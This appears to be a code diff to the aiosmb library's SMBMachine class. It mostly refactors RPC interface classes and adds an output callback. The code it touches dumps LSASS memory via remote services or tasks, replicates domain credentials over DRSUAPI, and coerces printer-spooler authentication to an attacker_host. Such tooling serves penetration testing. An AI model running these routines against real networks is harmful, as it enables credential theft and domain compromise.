@@ -8,15 +8,15 @@ from aiosmb.commons.interfaces.share import SMBShare
 from aiosmb.commons.interfaces.session import SMBUserSession
 from aiosmb.commons.interfaces.file import SMBFile
 from aiosmb.commons.interfaces.directory import SMBDirectory
-from aiosmb.dcerpc.v5.interfaces.srvsmgr import SMBSRVS
-from aiosmb.dcerpc.v5.interfaces.samrmgr import SMBSAMR
-from aiosmb.dcerpc.v5.interfaces.lsatmgr import LSAD
-from aiosmb.dcerpc.v5.interfaces.drsuapimgr import SMBDRSUAPI
-from aiosmb.dcerpc.v5.interfaces.servicemanager import SMBRemoteServieManager
-from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRP
-from aiosmb.dcerpc.v5.interfaces.rprnmgr import SMBRPRN
-from aiosmb.dcerpc.v5.interfaces.tschmgr import SMBTSCH
-from aiosmb.dcerpc.v5.interfaces.parmgr import SMBPAR
+from aiosmb.dcerpc.v5.interfaces.srvsmgr import SRVSRPC
+from aiosmb.dcerpc.v5.interfaces.samrmgr import SAMRRPC
+from aiosmb.dcerpc.v5.interfaces.lsatmgr import LSADRPC
+from aiosmb.dcerpc.v5.interfaces.drsuapimgr import DRSUAPIRPC
+from aiosmb.dcerpc.v5.interfaces.servicemanager import REMSVCRPC
+from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRPRPC
+from aiosmb.dcerpc.v5.interfaces.rprnmgr import RPRNRPC
+from aiosmb.dcerpc.v5.interfaces.tschmgr import TSCHRPC
+from aiosmb.dcerpc.v5.interfaces.parmgr import PARRPC
 
 
 
@@ -33,8 +33,9 @@ from aiosmb.protocol.smb2.commands.ioctl import CtlCode, IOCTLREQFlags
 from aiosmb.dcerpc.v5.rprn import PRINTER_CHANGE_ADD_JOB
 
 class SMBMachine:
-	def __init__(self, connection):
+	def __init__(self, connection, print_cb = None):
 		self.connection = connection
+		self.print_cb = print_cb
 		self.services = []
 		self.shares = []
 		self.localgroups = []
@@ -44,16 +45,16 @@ class SMBMachine:
 		self.privtable = {}
 		self.blocking_mgr_tasks = {}
 
-		self.named_rpcs = {
-			'SRVS' : SMBSRVS(self.connection),
-			'SAMR' : SMBSAMR(self.connection),
-			'LSAD' : LSAD(self.connection),
-			'RRP'  : RRP(self.connection),
-			'RPRN' : SMBRPRN(self.connection),
-			'TSCH' : SMBTSCH(self.connection),
-			'PAR'  : SMBPAR(self.connection),
-			'SERVICEMGR' : SMBRemoteServieManager(self.connection),
-
+		self.named_rpcs = {}
+		self.named_rpcs_proto = {
+			'SRVS' : SRVSRPC,
+			'SAMR' : SAMRRPC,
+			'LSAD' : LSADRPC,
+			'RRP'  : RRPRPC,
+			'RPRN' : RPRNRPC,
+			'TSCH' : TSCHRPC,
+			'PAR'  : PARRPC,
+			'SERVICEMGR' : REMSVCRPC,
 		}
 
 		self.open_rpcs = {}
@@ -89,14 +90,18 @@ class SMBMachine:
 
 	async def connect_rpc(self, service_name, reconnect = False):
 		try:
-			if service_name not in self.named_rpcs:
+			if service_name not in self.named_rpcs_proto:
 				raise Exception('Unknown service name : %s' % service_name)
 			
 			if service_name in self.open_rpcs and reconnect is False:
 				#print('Tried to reopen service %s' % service_name)
 				return True, None
 			
-			_, err = await self.named_rpcs[service_name].connect()
+			if service_name in ['PAR', 'RPRN','SRVS','SAMR','RRP','TSCH', 'LSAD', 'SERVICEMGR']: #new service interface
+				self.named_rpcs[service_name], err = await self.named_rpcs_proto[service_name].from_smbconnection(self.connection)
+			else:
+				self.named_rpcs[service_name] = self.named_rpcs_proto[service_name](self.connection)
+				_, err = await self.named_rpcs[service_name].connect()
 			if err is not None:
 				raise err
 			
@@ -367,18 +372,11 @@ class SMBMachine:
 						target_domain = domain
 						logger.debug('Domain available: %s' % domain)
 			
-			async with SMBDRSUAPI(self.connection, target_domain) as drsuapi:
-				try:
-					_, err = await drsuapi.connect()
-					if err is not None:
-						raise err
-					_, err = await drsuapi.open()
-					if err is not None:
-						raise err
-				except Exception as e:
-					logger.exception('Failed to connect to DRSUAPI!')
-					raise e
+			drsuapi, err = await DRSUAPIRPC.from_smbconnection(self.connection, domain = target_domain)
+			if err is not None:
+				raise err
 
+			async with drsuapi:
 				logger.debug('Using domain: %s' % target_domain)
 				if len(target_users) > 0:
 					for username in target_users:
@@ -470,7 +468,10 @@ class SMBMachine:
 				raise err
 			
 			if silent is False:
-				print('[%s] Service created with name: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+				if self.print_cb is not None:
+					await self.print_cb('[%s] Service created with name: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+				else:
+					print('[%s] Service created with name: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
 			
 			_, err = await self.start_service(service_name)
 
@@ -481,7 +482,10 @@ class SMBMachine:
 				if err is not None:
 					continue
 				if silent is False:
-					print('[%s] Dump file is now accessible here: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip(), lsass_file_name))
+					if self.print_cb is not None:
+						await self.print_cb('[%s] Dump file is now accessible here: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip(), lsass_file_name))
+					else:
+						print('[%s] Dump file is now accessible here: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip(), lsass_file_name))
 				return temp, None
 
 			return None, err
@@ -492,10 +496,16 @@ class SMBMachine:
 			if err is not None:
 				logger.debug('Failed to delete service!')
 				if silent is False:
-					print('[%s] Failed to remove service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+					if self.print_cb is not None:
+						await self.print_cb('[%s] Failed to remove service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+					else:
+						print('[%s] Failed to remove service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
 			else:
 				if silent is False:
-					print('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+					if self.print_cb is not None:
+						await self.print_cb('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+					else:
+						print('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
 
 	
 	async def service_cmd_exec(self, command, display_name = None, service_name = None):
@@ -716,7 +726,10 @@ class SMBMachine:
 				raise err
 			
 			if silent is False:
-				print('[%s] Dumping task created on remote end, now waiting...' % self.connection.target.get_hostname_or_ip())
+				if self.print_cb is not None:
+					await self.print_cb('[%s] Dumping task created on remote end, now waiting...' % self.connection.target.get_hostname_or_ip())
+				else:
+					print('[%s] Dumping task created on remote end, now waiting...' % self.connection.target.get_hostname_or_ip())
 
 			for _ in range(5):
 				await asyncio.sleep(5)
@@ -725,7 +738,10 @@ class SMBMachine:
 				if err is not None:
 					continue
 				if silent is False:
-					print('[%s] Remote file location: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip() ,lsass_file_name))
+					if self.print_cb is not None:
+						await self.print_cb('[%s] Remote file location: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip() ,lsass_file_name))
+					else:
+						print('[%s] Remote file location: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip() ,lsass_file_name))
 				return temp, None
 
 			return None, err
@@ -742,16 +758,21 @@ class SMBMachine:
 			if err is not None:
 				raise err
 
-			print('opening printer')
-			handle, _ = await rr(self.named_rpcs['RPRN'].open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip()))
-			print('got handle %s' % handle)
-			resp, _ = await rr(self.named_rpcs['RPRN'].hRpcRemoteFindFirstPrinterChangeNotificationEx(
+			if self.print_cb is not None:
+				await self.print_cb('opening printer')
+			else:
+				print('opening printer')
+			handle, err = await self.named_rpcs['RPRN'].open_printer('\\\\%s\x00' % self.connection.target.get_hostname_or_ip())
+			if err is not None:
+				raise err
+			resp, err = await self.named_rpcs['RPRN'].hRpcRemoteFindFirstPrinterChangeNotificationEx(
 				handle,
 				PRINTER_CHANGE_ADD_JOB,
 				pszLocalMachine = '\\\\%s\x00' % attacker_host,
 
-			))
-			print('got resp! %s' % resp)
+			)
+			if err is not None:
+				raise err
 			return True, None
 		except Exception as e:
 			return None, e
